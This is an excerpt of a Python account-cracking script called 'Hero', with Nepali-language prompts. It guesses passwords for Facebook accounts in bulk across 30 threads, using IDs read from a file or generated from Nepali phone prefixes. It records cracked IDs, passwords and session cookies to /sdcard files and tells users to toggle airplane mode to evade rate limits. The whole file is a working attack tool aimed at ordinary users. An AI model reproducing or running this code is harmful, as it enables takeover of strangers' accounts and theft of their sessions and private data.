...
sys.stdout.write('\x1b]2; Hero\x07')
...
def menu():   
    ...
    if select =='1':
        ...
        print(f'{G1}[{A}={G2}]{G2} VALID OPTION LEKH MUJI')
        time.sleep(2)
        menu()
#__________________[ RANDOM ]__________________#      
def _randm_():   
    clear()
    print(f'{G1}[{A}1{G1}]{G1} NEPAL CLONING')
    print(f'{G1}[{A}2{G2}]{G2} ALL COUNTRY CLONING')
...
def _bd_():
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} 9740{A}/{G1}9841{A}/{G1}9740{A}/{G1}9820');linex()
    ...
    with sanjidabou(max_workers=30) as sexy:
        ...
        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE ON GAR HAI MUJI {A}5{G3} MIN MA');linex()
        for love in user:
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/Hero.txt');linex()
        self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{G1}[{A}={G2}]{G2} OPPS FILE VETENA MUJI RAMRO RI LEKH ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            sys.stdout.write(f"\r{G1}[{A}Hero-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[Hero-OK] {sid} | {ps} ")
                    print(f"\r\r{G1}[COOKIE]{A} {ckkk}")
                    open('/sdcard/Hero-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[Hero-CP] {sid} | {ps} ")
                     open('/sdcard/Hero-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                     break
                else:
                    continue
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}Hero-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[Hero-OK] {sid} | {ps} ")
                    print(f'\r\r{G1}[COOKIE]{A} {ckkk}')
                    open('/sdcard/Hero-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[Hero-CP] {sid} | {ps} ")
                    open('/sdcard/Hero-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            ...
            linex()
            if sl =='':
                print(f'{G1}[{A}={G5}]{G5} PUT LIMIT BETWEEN 1 TO 25')
            elif sl > 20:
                print(f'{G1}[{A}={G1}]{G1} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 25')
            else:
                for sr in range(sl):
            ...
            print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}5{G3} MIN')
            linex()
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}Hero{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[Hero-OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{A} {coki}')
                open('/sdcard/Hero-R-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
